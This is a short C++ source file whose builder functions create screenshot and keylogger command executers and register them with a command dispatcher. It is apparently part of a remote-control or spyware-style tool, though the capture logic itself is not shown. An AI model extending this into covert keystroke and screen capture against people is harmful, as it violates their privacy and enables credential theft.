#include "utils/builders.h"

#include "command/execute/ScreenshotExecuter.h"
#include "command/execute/KeyloggerExecuter.h"


command::ICommandExecuter*
utils::builders::BuildScreenshotExecuter()
{
    return ( new command::ScreenshotExecuter(1, "screenshot") );
}

command::ICommandExecuter*
utils::builders::BuildKeyloggerExecuter()
{
    return ( new command::KeyloggerExecuter(2, "keylogger") );
}

command::CommandManager*
utils::builders::BuildManager()
{
    command::CommandManager *dispatcher = new command::CommandManager();

    dispatcher->Add(BuildScreenshotExecuter());
    dispatcher->Add(BuildKeyloggerExecuter());

    return ( dispatcher );
}


